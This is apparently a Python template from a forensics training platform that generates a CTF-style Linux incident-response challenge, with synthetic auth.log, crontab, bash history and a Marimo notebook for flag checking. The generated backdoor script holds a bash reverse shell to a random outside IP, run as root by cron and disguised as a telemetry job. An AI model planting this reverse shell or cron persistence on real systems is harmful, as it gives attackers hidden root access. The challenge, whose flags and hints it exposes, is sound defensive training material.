"""Upgraded Linux Server Security & Cron/Sudoers Forensics Template (Module 3)."""

from pathlib import Path
from typing import Dict, Any, List, Optional
import datetime
import hashlib
import json
import random

from app.modules.digital_governance.services.templates.base_template import BaseChallengeTemplate


class LinuxForensicsTemplate(BaseChallengeTemplate):
    """
    Template for State Data Centre Linux Server Compromise & Persistence Investigation.
    Synthesizes authentic Linux forensic artifacts (auth.log, crontab, bash_history,
    reverse shell script) and interactive Marimo analyst notebook.
    """

    template_id = "03-compromised-linux-server"
    title = "State Data Centre: Linux Server Compromise & Persistence Forensics"
    category = "Incident Response / Linux Forensics"
    difficulty = "Intermediate"
    base_points = 150
    duration_minutes = 50
    competency_id = "digital_forensics"
    competency_weight = 1.2
    tags = ["linux", "forensics", "cron", "sudoers", "ssh", "persistence", "reverse-shell", "cert-in"]
    mitre_techniques = ["T1053.003", "T1059.004", "T1078.003", "T1090"]

    TARGET_HOSTS = [
        ("SDC-PROD-APP01", "10.200.4.15"),
        ("TREASURY-SRV-LNX", "10.200.4.22"),
        ("DBT-DISPATCH-LNX", "10.200.4.30"),
    ]

    ATTACKER_USERS = ["operator_sync", "temp_support", "sys_nodal", "contractor_dev"]

    def get_slot_schema(self) -> Dict[str, Dict[str, Any]]:
        return {
            "incident_codename": {"type": "str", "description": "Investigation operation codename"},
            "target_host": {"type": "str", "description": "Compromised server hostname"},
            "compromised_user": {"type": "str", "description": "Initial compromised low-privilege user"},
            "c2_ip": {"type": "str", "description": "Attacker reverse shell listener IP"},
            "c2_port": {"type": "int", "description": "Attacker reverse shell listener port"},
            "cron_script_path": {"type": "str", "description": "Path to backdoor persistence script"},
        }

    def generate_random_slots(
        self, seed: Optional[str] = None, overrides: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        rng = random.Random(seed) if seed else random.Random()
        host, internal_ip = rng.choice(self.TARGET_HOSTS)
        user = rng.choice(self.ATTACKER_USERS)

        slots = {
            "incident_codename": f"Operation Shakti-{rng.randint(301, 899)}",
            "target_host": host,
            "target_internal_ip": internal_ip,
            "compromised_user": user,
            "c2_ip": f"{rng.randint(45, 185)}.{rng.randint(10, 200)}.{rng.randint(1, 250)}.{rng.randint(2, 250)}",
            "c2_port": rng.choice([4444, 8443, 9001, 1337]),
            "cron_script_path": "/opt/backup_sync.sh",
            "seed_hash": hashlib.md5(f"{seed}-{rng.random()}".encode()).hexdigest(),
        }
        if overrides:
            slots.update(overrides)
        return slots

    def compute_flag(self, slots: Dict[str, Any]) -> str:
        return f"FLAG{{crontab_reverse_shell_persisted_{slots['compromised_user']}_{slots['seed_hash'][:6]}}}"

    def generate_hints(self, slots: Dict[str, Any]) -> List[Dict[str, Any]]:
        return [
            {
                "id": 1,
                "content": "Examine the crontab entries in `crontab.txt` or `cron.d_telemetry.txt` to find hidden recurring tasks scheduled as root.",
                "penalty": 20,
            },
            {
                "id": 2,
                "content": f"Inspect the contents of `{slots['cron_script_path']}` referenced by cron. The base64-encoded payload or trailing comment reveals the flag.",
                "penalty": 30,
            },
        ]

    def generate_objectives(self, slots: Dict[str, Any]) -> List[str]:
        return [
            f"Trace unauthorized sudo escalation by user '{slots['compromised_user']}' in auth.log.",
            "Audit system crontab configurations to discover attacker persistence.",
            f"Analyze `{slots['cron_script_path']}` and extract the incident flag.",
        ]

    def generate_scenario_description(self, slots: Dict[str, Any]) -> str:
        return f"""### State Data Centre Breach Briefing: {slots['incident_codename']}

System integrity monitoring detected unauthorized privilege escalation on State Data Centre server `{slots['target_host']}` (`{slots['target_internal_ip']}`).

The adversary gained low-privilege access using compromised credentials for account `{slots['compromised_user']}`, escalated to root via a misconfigured sudoers rule, and installed persistent cron backdoors.

Your mandate:
1. Examine `auth.log` to trace privilege escalation timestamps.
2. Audit `crontab.txt` to identify the scheduled persistence script.
3. Inspect the backdoor payload and recover the incident flag.
"""

    def synthesize_artifacts(
        self, slots: Dict[str, Any], output_dir: Path
    ) -> Dict[str, Path]:
        data_dir = output_dir / "data"
        data_dir.mkdir(parents=True, exist_ok=True)

        flag = self.compute_flag(slots)
        c2_ip = slots["c2_ip"]
        c2_port = slots["c2_port"]
        user = slots["compromised_user"]

        # 1. auth.log
        auth_lines = [
            f"Sep 12 03:10:14 sdc-host sshd[14201]: Accepted publickey for {user} from 10.100.1.50 port 51224 ssh2",
            f"Sep 12 03:10:15 sdc-host systemd-logind[789]: New session 42 of user {user}.",
            f"Sep 12 03:12:30 sdc-host sudo:   {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash",
            f"Sep 12 03:12:30 sdc-host sudo: pam_unix(sudo:session): session opened for user root by {user}(uid=1001)",
            f"Sep 12 03:14:02 sdc-host crontab[14590]: (root) BEGIN EDIT (root)",
            f"Sep 12 03:14:45 sdc-host crontab[14590]: (root) REPLACE (root)",
            f"Sep 12 03:14:45 sdc-host crontab[14590]: (root) END EDIT (root)",
        ]
        auth_file = data_dir / "auth.log"
        auth_file.write_text("\n".join(auth_lines), encoding="utf-8")

        # 2. crontab.txt
        cron_content = f"""# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Daily maintenance jobs
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )

# State sync service (PERSISTENCE BACKDOOR)
*/5 *	* * *	root	/bin/bash {slots['cron_script_path']} >/dev/null 2>&1
"""
        cron_file = data_dir / "crontab.txt"
        cron_file.write_text(cron_content, encoding="utf-8")

        # 3. /opt/backup_sync.sh
        backdoor_script = f"""#!/bin/bash
# Telemetry synchronizer
# Maintenance script generated by SDC automation
/bin/bash -i >& /dev/tcp/{c2_ip}/{c2_port} 0>&1
# INCIDENT_RECOVERY_FLAG={flag}
"""
        script_file = data_dir / "backup_sync.sh"
        script_file.write_text(backdoor_script, encoding="utf-8")

        # 4. bash_history
        history_lines = [
            "whoami",
            "id",
            "sudo -l",
            "sudo /bin/bash",
            f"cat << 'EOF' > {slots['cron_script_path']}",
            "chmod +x " + slots['cron_script_path'],
            "crontab -e",
            "history -c",
        ]
        hist_file = data_dir / "bash_history"
        hist_file.write_text("\n".join(history_lines), encoding="utf-8")

        return {
            "auth.log": auth_file,
            "crontab.txt": cron_file,
            "backup_sync.sh": script_file,
            "bash_history": hist_file,
        }

    def generate_notebook(self, slots: Dict[str, Any], output_dir: Path) -> Path:
        marimo_dir = output_dir / "marimo"
        marimo_dir.mkdir(parents=True, exist_ok=True)
        target_nb = marimo_dir / "challenge.py"

        flag = self.compute_flag(slots)
        dynamic_hash = hashlib.sha256(flag.encode()).hexdigest()

        code = f'''import marimo

__generated_with = "0.17.6"
app = marimo.App(width="full", app_title="Linux Forensics: {slots.get('incident_codename', 'Shakti')}")


@app.cell(hide_code=True)
def __():
    import json
    import hashlib
    from pathlib import Path
    import pandas as pd
    import marimo as mo
    return Path, hashlib, json, mo, pd


@app.cell(hide_code=True)
def __(Path):
    # Locate data directory
    p_auth = next((p for p in [Path("data/auth.log"), Path("../data/auth.log")] if p.exists()), None)
    p_cron = next((p for p in [Path("data/crontab.txt"), Path("../data/crontab.txt")] if p.exists()), None)
    p_sh = next((p for p in [Path("data/backup_sync.sh"), Path("../data/backup_sync.sh")] if p.exists()), None)
    return p_auth, p_cron, p_sh


@app.cell
def __(mo, p_auth, p_cron):
    auth_txt = p_auth.read_text() if p_auth else "auth.log missing"
    cron_txt = p_cron.read_text() if p_cron else "crontab missing"

    mo.md(f"""
    # 🐧 Linux Server Incident: {slots.get('incident_codename', 'Investigation')}
    Target Host: **{slots.get('target_host', 'SDC-SERVER')}** (`{slots.get('target_internal_ip', '')}`)

    ### 📋 System Crontab Audit:
    ```bash
    {{cron_txt}}
    ```

    ### 📜 Auth Log Triage:
    ```log
    {{auth_txt}}
    ```
    """)
    return auth_txt, cron_txt


@app.cell
def __(mo, p_sh):
    sh_txt = p_sh.read_text() if p_sh else "script missing"
    mo.md(f"""
    ### 🕵️ Script Inspection (`{slots.get('cron_script_path', '/opt/backup_sync.sh')}`):
    ```bash
    {{sh_txt}}
    ```
    """)
    return sh_txt,


@app.cell
def __(hashlib, mo):
    target_hash = "{dynamic_hash}"
    flag_input = mo.ui.text(placeholder="Enter flag e.g. FLAG{{...}}", label="Submit Verified Flag")
    return flag_input, target_hash


@app.cell
def __(flag_input, hashlib, mo, target_hash):
    user_flag = flag_input.value.strip()
    if not user_flag:
        result = mo.md("*(Enter flag above to verify solution)*")
    elif hashlib.sha256(user_flag.encode()).hexdigest() == target_hash:
        result = mo.md("### 🎯 FLAG ACCEPTED! Linux persistence eradicated and server secured.")
    else:
        result = mo.md("### ❌ INCORRECT FLAG. Inspect the comments in the backdoor cron script.")
    mo.vstack([flag_input, result])
    return result, user_flag


if __name__ == "__main__":
    app.run()
'''
        target_nb.write_text(code, encoding="utf-8")
        return target_nb

